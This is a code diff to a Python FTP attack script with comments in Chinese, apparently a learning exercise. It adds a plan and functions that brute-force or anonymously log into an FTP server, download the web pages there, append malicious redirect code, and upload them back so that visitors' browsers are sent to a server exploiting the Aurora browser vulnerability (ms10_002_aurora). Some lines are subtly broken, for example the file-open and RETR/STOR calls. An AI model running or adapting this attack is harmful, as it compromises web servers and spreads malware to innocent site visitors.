@@ -1,6 +1,12 @@
 """
 FTP服务允许用户基于一个tcp来传输文件，一般用户使用用户名和密码登录FTP服务器
 一些FTP服务器提供匿名登录的能力(匿名FTP访问有助于网站访问软件更新)
+
+1:能否匿名登录，不能则是否能暴力破解
+2:登录进去,扫描.php,htm结尾的文件的网页
+3:下载网页，加入恶意重定向代码
+4:传回该网页到该服务器
+重定向到一个恶意服务器,有ms10_002_aurora漏洞的浏览器连接到该恶意服务器后，ftp      -*
 """
 import ftplib
 
@@ -37,7 +43,6 @@ def bruteLgin(hostname, passwdFile):
     return (None, None)
 
 
-
 # 3. FTP服务器上搜索web服务（搜索是否有index.html)
 def returnDefault(ftp):
     try:
@@ -60,6 +65,26 @@ def returnDefault(ftp):
             print("发现文件"+fileName)
             retlist.append(fileName)
     return retlist
+
+# 4.注入恶意代码
+# https://www.cnblogs.com/mcladyr/p/14110880.html
+def  injectPage(ftp,page,redirect):
+    f = open(page,'.tmp','w')
+    ftp.retrlines("RETR"+page,f.write)  # 下载文件
+    print("下载文件"+page)
+    f.write(redirect)
+    f.close()
+    print("注入代码"+page)
+    ftp.storlines("STOR"+page,open(page+'.tmp'))
+    print("上传注入后文件"+page)
+
+def attack(username,password,tgthost,redirect):
+    ftp = ftplib.FTP(tgthost)
+    ftp.login(username,password)
+    defPages = returnDefault(ftp)
+    for defPage in defPages:
+        injectPage(ftp,defPage,redirect)
+
 
 if __name__ == '__main__':
     host = '192.168.8.243'
